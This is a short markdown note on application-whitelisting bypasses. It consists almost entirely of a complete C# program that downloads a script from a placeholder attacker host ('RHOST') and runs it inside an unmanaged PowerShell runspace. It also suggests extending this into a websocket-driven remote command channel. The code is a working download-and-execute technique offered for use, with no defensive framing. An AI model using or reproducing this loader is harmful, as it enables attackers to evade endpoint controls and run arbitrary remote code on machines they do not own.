# Application Whitelisting Bypasses
---

### PowerShell Runspace
This will allow you to execute the contents of a remote file in a PowerShell runspace. This could be improved by creating a websocket server/client to execute commands within the runspace. 
```cs
using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace ConsoleApp3
{
    public class Program
    {
        public static void Main(string[] args)
        {
            WebClient client = new WebClient();
            var myString = client.DownloadString("http://RHOST/string.txt");
            Console.WriteLine("Command to be executed: " + myString);
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(myString);
            Console.WriteLine("Executing command ...");
            ps.Invoke();
            Console.WriteLine("Command executed.");
            rs.Close();
        }
    }
}
```
